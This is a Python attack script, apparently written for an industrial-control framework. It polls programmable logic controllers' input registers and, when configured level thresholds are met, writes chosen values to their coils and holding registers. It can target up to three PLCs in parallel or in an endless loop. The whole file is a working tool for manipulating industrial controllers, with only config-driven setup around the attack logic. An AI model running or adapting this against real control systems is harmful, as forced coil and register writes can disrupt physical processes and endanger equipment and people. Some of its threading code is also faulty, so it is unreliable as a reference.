#!/usr/bin/env python3
import configparser
import threading

def attack(ctx):  

    def on_level_change_plc(value: int, address):

        # Read from config.ini
        config = configparser.ConfigParser()
        config.read('config.ini')

        print(address)

        pckt_number = config.get('params', 'packets_number')
        pckt_value = int(config.get('params', 'packets_value'))

        if(pckt_number == "loop"): 
            while(True):
                case = 0
                print('PLC level value', value)

                sup_lim = ""
                inf_lim = ""
                
                if checkTrigger(address):
                    # Trigger checked
                    if(config.get('plc', 'plc1') == address):
                        sup_lim = config.get('params', 'coil1_sup_limit')
                        inf_lim = config.get('params', 'coil1_inf_limit')
                    elif(config.get('plc', 'plc2') == address): 
                        sup_lim = config.get('params', 'coil2_sup_limit')
                        inf_lim = config.get('params', 'coil2_inf_limit')
                    elif(config.get('plc', 'plc3') == address): 
                        sup_lim = config.get('params', 'coil3_sup_limit')
                        inf_lim = config.get('params', 'coil3_inf_limit')

                    if(sup_lim == "" and inf_lim == ""): # No limits
                        print("No limits!")   
                    elif(sup_lim != "" and inf_lim == ""): # Only sup limit
                        sup_lim = int(sup_lim)
                        if(value >= sup_lim):
                            trigger_operation_plc(pckt_value, address)
                        else:
                            print("Waiting for triggers...")
                            value +=1
                        
                    elif(sup_lim == "" and inf_lim != ""): # Only inf limit
                        inf_lim = int(inf_lim)
                        if(value <= inf_lim):
                            trigger_operation_plc(pckt_value, address)
                        else:
                            print("Waiting for triggers...")
                            value -=1
                                                            
                    else:
                        sup_lim = int(sup_lim)
                        inf_lim = int(inf_lim)
                        if(value <= sup_lim and value >= inf_lim):
                            trigger_operation_plc(pckt_value, address)
                        else:
                            print("Waiting for triggers...")
                            if(value > sup_lim):
                                value -= 1
                            elif(value < inf_lim):
                                value +=1
                      
                else:
                    # Trigger unchecked - only main conditions
                            trigger_operation_plc(pckt_value, address)

        else:
            # Pckt number != loop
            ct = 0
            n = int(pckt_number)
            while(ct < n):
                print('PLC level value', value)
                
                if checkTrigger(address):
                    # Trigger checked
                    if(config.get('plc', 'plc1') == address):
                        sup_lim = config.get('params', 'coil1_sup_limit')
                        inf_lim = config.get('params', 'coil1_inf_limit')
                    elif(config.get('plc', 'plc2') == address): 
                        sup_lim = config.get('params', 'coil2_sup_limit')
                        inf_lim = config.get('params', 'coil2_inf_limit')
                    elif(config.get('plc', 'plc3') == address): 
                        sup_lim = config.get('params', 'coil3_sup_limit')
                        inf_lim = config.get('params', 'coil3_inf_limit')

                    if(sup_lim == "" and inf_lim == ""): # No limits
                        print("No limits!")   
                    elif(sup_lim != "" and inf_lim == ""): # Only sup limit
                        sup_lim = int(sup_lim)
                        if(value >= sup_lim):
                            trigger_operation_plc(pckt_value, address)
                        else:
                            print("Waiting for triggers...")
                            value +=1
                        
                    elif(sup_lim == "" and inf_lim != ""): # Only inf limit
                        inf_lim = int(inf_lim)
                        if(value <= inf_lim):
                            trigger_operation_plc(pckt_value, address)
                        else:
                            print("Waiting for triggers...")
                            value -=1
                                                            
                    else:
                        sup_lim = int(sup_lim)
                        inf_lim = int(inf_lim)
                        if(value <= sup_lim and value >= inf_lim):
                            trigger_operation_plc(pckt_value, address)
                        else:
                            print("Waiting for triggers...")
                            if(value > sup_lim):
                                value -= 1
                            elif(value < inf_lim):
                                value +=1
                      
                else:
                    # Trigger unchecked - only main conditions
                            trigger_operation_plc(pckt_value, address)
                ct = ct + 1
    

    def checkTrigger(address):
        
        config = configparser.ConfigParser()
        config.read('config.ini')

        if(address == config.get('plc', 'plc1')):
            coil_1_sup_limit = config.get('params', 'coil1_sup_limit')
            coil_1_inf_limit = config.get('params', 'coil1_inf_limit')

            if(coil_1_sup_limit == "" and coil_1_inf_limit == ""):
                return False

        elif(address == config.get('plc', 'plc2')):
            coil_2_sup_limit = config.get('params', 'coil2_sup_limit')
            coil_2_inf_limit = config.get('params', 'coil2_inf_limit')

            if(coil_2_sup_limit == "" and coil_2_inf_limit == ""):
                return False

        elif(address == config.get('plc', 'plc3')):
            coil_3_sup_limit = config.get('params', 'coil3_sup_limit')
            coil_3_inf_limit = config.get('params', 'coil3_inf_limit')

            if(coil_3_sup_limit == "" and coil_3_inf_limit == ""):
                return False
        

        return True
    
    
    
    def trigger_operation_plc(p_val, address):
        
        config = configparser.ConfigParser()
        config.read('config.ini')
        
        plc_choice = ""
        if(address == config.get('plc', 'plc1')):
            plc_choice = config.get('params', 'plc1_choice')
            sett = "plc1"
        elif(address == config.get('plc', 'plc2')):
            plc_choice = config.get('params', 'plc2_choice')
            sett = "plc2"
        elif(address == config.get('plc', 'plc3')):
            plc_choice = config.get('params', 'plc3_choice')
            sett = "plc3"
            
            
        coil = []
        reg = []
        reg_d = []
                
        # Extracting choices coils/registers
        choices_list = [choice.strip() for choice in plc_choice.split(',')]
        
        #print(choices_list)
        
        for choice in choices_list:
            if choice.startswith('c'):
                temp = ctx.register(sett, 'C', int(choice[-1]))
                temp.write(p_val)
                print(f"Writing on %QX0.{int(choice[-1])} - {sett}")
            elif choice.startswith('r'):
                temp = ctx.register(sett, 'H', int(choice[-1]))
                temp.write(p_val)
                print(f"Writing on %MX0.{int(choice[-1])} - {sett}")
            elif choice.startswith('m'):
                temp = ctx.register(sett, 'H', int(choice[-1])+1024)
                temp.write(p_val)
                print(f"Writing on %MW0.{int(choice[-1])} - {sett}")
                
            
        
        #TODO register write          
        
        if p_val == 0:
            print('COMMAND OFF - Value wrote:', p_val)
        elif p_val == 1:
            print('COMMAND ON - Value wrote:', p_val)

    
    # Read from config.ini
    config = configparser.ConfigParser()
    config.read('config.ini')

    plc_values = {}

    for plc_key in config['plc']:
        plc_values[plc_key] = config.get('plc', plc_key)
    
    #print(plc_values)  

    # Allocate all IW registers
    if(len(plc_values)== 1):
        plc_1_input_register = ctx.register('plc1', 'I', 0)
    elif(len(plc_values)== 2):
        plc_1_input_register = ctx.register('plc1', 'I', 0)
        plc_2_input_register = ctx.register('plc2', 'I', 0)
    else:
        plc_1_input_register = ctx.register('plc1', 'I', 0)
        plc_2_input_register = ctx.register('plc2', 'I', 0)
        plc_3_input_register = ctx.register('plc3', 'I', 0)

    # PLC attack
    # ONE PLC selected
    if config.get('params', 'plc1_choice') != "" and (config.get('params', 'plc2_choice') == "" and config.get('params', 'plc3_choice') == ""):
        
        print("Attacking one plc...")
        plc_1_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc1')))
        

    # TWO PLCs selected
    if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') == "":
        print("Attacking two plcs...")

        # Threads operations
        thread1 = threading.Thread(target=plc_1_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc1'))))
        thread2 = threading.Thread(target=plc_2_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc2'))))

        thread1.start()
        thread2.start()
        thread1.join()
        thread2.join()

    # THREE PLCs selected 
    if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
        print("Attacking three plcs...")

        # Threads operations
        thread1 = threading.Thread(target=plc_1_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc1'))))
        thread2 = threading.Thread(target=plc_2_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc2'))))
        thread3 = threading.Thread(target=plc_3_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc3'))))

        thread1.start()
        thread2.start()
        thread3.start()
        thread1.join()
        thread2.join()
        thread3.join()

    

